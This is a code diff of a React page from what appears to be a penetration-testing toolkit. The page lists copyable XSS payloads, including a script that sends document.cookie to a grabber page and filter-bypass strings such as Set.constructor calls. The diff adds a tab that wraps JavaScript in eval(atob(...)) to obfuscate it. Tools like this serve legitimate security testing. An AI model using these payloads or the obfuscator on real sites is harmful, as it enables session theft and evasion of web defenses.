@@ -1,9 +1,10 @@
-import React from 'react';
-import { Typography, Divider } from 'antd';
-
+import React, { useState } from 'react';
+import { Typography, Divider, Tabs } from 'antd';
+import TextArea from 'antd/lib/input/TextArea';
+import type { TabsProps } from 'antd';
 const { Title, Paragraph, Text } = Typography;
 
-export default function XSS () {
+export default function XSS() {
     const DataGrabber = [
         {
             title: "<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>"
@@ -66,8 +67,10 @@ export default function XSS () {
         { title: "Set.constructor('ale'+'rt(13)')();" },
         { title: 'Set.constructor`al\x65rt\x2814\x29```;' }
     ];
-    return (
-        <div>
+
+
+    const XSSPayloadsComponent = (
+        <>
             <Title level={2} style={{ fontWeight: 'bold', margin: 15 }}>
                 Cross Site Scripting (XSS)
             </Title>
@@ -91,13 +94,13 @@ export default function XSS () {
                     Obtains the administrator cookie or sensitive access token, the following payload will send it to a
                     controlled page.
                 </Paragraph>
-                {DataGrabber.map( ( k, i ) => {
+                {DataGrabber.map((k, i) => {
                     return (
                         <Paragraph key={i}>
                             <pre><Text copyable>{k.title}</Text></pre>
                         </Paragraph>
                     );
-                } )}
+                })}
             </div>
             <Divider orientation='center'>XSS in HTML/Applications</Divider>
             <div
@@ -106,20 +109,20 @@ export default function XSS () {
                     padding: 15
                 }}
             >
-                {BasicXSS.map( ( k, i ) => {
+                {BasicXSS.map((k, i) => {
                     return (
                         <Paragraph key={i}>
                             <pre><Text copyable>{k.title}</Text></pre>
                         </Paragraph>
                     );
-                } )}
-                {ImgPayload.map( ( k, i ) => {
+                })}
+                {ImgPayload.map((k, i) => {
                     return (
                         <Paragraph key={i}>
                             <pre><Text copyable>{k.title}</Text></pre>
                         </Paragraph>
                     );
-                } )}
+                })}
             </div>
             <Divider orientation='center'>XSS in Markdown</Divider>
             <div
@@ -128,13 +131,13 @@ export default function XSS () {
                     padding: 15
                 }}
             >
-                {XSSMarkdown.map( ( k, i ) => {
+                {XSSMarkdown.map((k, i) => {
                     return (
                         <Paragraph key={i}>
                             <pre><Text copyable>{k.title}</Text></pre>
                         </Paragraph>
                     );
-                } )}
+                })}
             </div>
             <Divider orientation='center'>XSS in SVG (short)</Divider>
             <div
@@ -143,13 +146,13 @@ export default function XSS () {
                     padding: 15
                 }}
             >
-                {XSSSvg.map( ( k, i ) => {
+                {XSSSvg.map((k, i) => {
                     return (
                         <Paragraph key={i}>
                             <pre><Text copyable>{k.title}</Text></pre>
                         </Paragraph>
                     );
-                } )}
+                })}
             </div>
             <Divider orientation='center'>Bypass word blacklist with code evaluation</Divider>
             <div
@@ -158,14 +161,61 @@ export default function XSS () {
                     padding: 15
                 }}
             >
-                {BypassWord.map( ( k, i ) => {
+                {BypassWord.map((k, i) => {
                     return (
                         <Paragraph key={i}>
                             <pre><Text copyable>{k.title}</Text></pre>
                         </Paragraph>
                     );
-                } )}
+                })}
             </div>
-        </div>
+        </>
+    )
+
+
+    const XSSObfuscator = () => {
+
+        const [js, setJS] = useState('');
+        const [obfuscated, setObfuscated] = useState('');
+
+        const handleOnChange = (e) => {
+            setJS(e.target.value);
+            // base64 encode the js
+            const obf = btoa(e.target.value);
+            setObfuscated(`eval(atob('${obf}'))`)
+
+        }
+
+
+        return <>
+            <Title level={2} style={{ fontWeight: 'bold', margin: 15 }}>
+                JS Obfuscatation
+            </Title>
+            <TextArea rows={4} onChange={handleOnChange} value={js} />
+            <Divider orientation='center'>Obfuscated</Divider>
+            <TextArea rows={4} value={obfuscated} />
+        </>
+
+    }
+
+    const items: TabsProps['items'] = [
+        {
+            key: '1',
+           label: 'XSS Payloads',
+           children: XSSPayloadsComponent
+        },
+        {
+            key: '2',
+            label: 'XSS Obfuscator',
+            children: XSSObfuscator()
+        }
+
+    ];
+
+
+    return (
+        <>
+            <Tabs defaultActiveKey="1" items={items} />
+        </>
     );
 }
